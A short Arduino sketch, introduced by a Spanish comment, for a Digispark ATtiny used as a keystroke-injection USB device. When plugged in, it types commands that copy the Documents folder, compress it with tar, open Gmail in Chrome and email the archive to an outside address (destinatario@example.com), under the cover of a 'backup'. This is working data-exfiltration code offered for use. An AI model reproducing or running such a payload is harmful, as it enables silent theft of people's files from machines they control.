//mira ya encontre en mis empolvados archivos , este es el codigo basico para usar la attiny para compromir una carpeta y mandarla por correo 
#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.delay(5000); // Esperar 5 segundos
  
  // Abrir el menú de inicio y abrir el símbolo del sistema
  DigiKeyboard.sendKeyStroke(0); // Abrir el menú de inicio
  DigiKeyboard.delay(1000); // Esperar 1 segundo
  DigiKeyboard.print("cmd"); // Escribir "cmd" para abrir el símbolo del sistema
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
  DigiKeyboard.delay(1000); // Esperar 1 segundo
  
  // Copiar la carpeta de documentos
  DigiKeyboard.print("xcopy C:\\Users\\Username\\Documents C:\\Backup\\ /E /I /H");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
  DigiKeyboard.delay(10000); // Esperar 10 segundos
  
  // Comprimir la carpeta de copia de seguridad
  DigiKeyboard.print("tar -czvf backup.tar.gz C:\\Backup\\");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
  DigiKeyboard.delay(10000); // Esperar 10 segundos
  
  // Abrir Chrome y abrir Gmail
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abrir Ejecutar
  DigiKeyboard.delay(1000); // Esperar 1 segundo
  DigiKeyboard.print("chrome"); // Escribir "chrome" para abrir Chrome
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
  DigiKeyboard.delay(10000); // Esperar 10 segundos para que Chrome se abra
  DigiKeyboard.print("https://mail.google.com/mail/u/0/#inbox?compose=new"); // Abrir Gmail y redactar un nuevo correo
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
  DigiKeyboard.delay(15000); // Esperar 15 segundos para que Gmail se abra completamente
  
  // Escribir la dirección de correo electrónico del destinatario
  DigiKeyboard.print("destinatario@example.com");
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Saltar al campo de asunto
  
  // Escribir el asunto del correo electrónico
  DigiKeyboard.print("Backup de documentos");
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Saltar al cuerpo del correo electrónico
  
  // Escribir el cuerpo del correo electrónico
  DigiKeyboard.print("Adjunto el archivo de copia de seguridad.");
  
  // Navegar al botón de adjuntar archivo presionando Tab cuatro veces
  for(int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(100); // Pequeña pausa entre pulsaciones de teclas
  }
  
  // Presionar Enter para seleccionar el archivo adjunto
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); // Esperar 1 segundo
  
  // Escribir la ruta completa del archivo adjunto
  DigiKeyboard.print("C:\\Backup\\backup.tar.gz");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter para adjuntar el archivo
  DigiKeyboard.delay(10000); // Esperar 10 segundos para que se adjunte el archivo
  
  // Navegar al botón de enviar presionando Tab
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Presionar Tab para navegar al botón de enviar
  DigiKeyboard.delay(1000); // Esperar 1 segundo
  
  // Enviar el correo electrónico
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter para enviar el correo electrónico
}

void loop() {
  // El bucle vacío mantiene el programa en ejecución después de la configuración
}
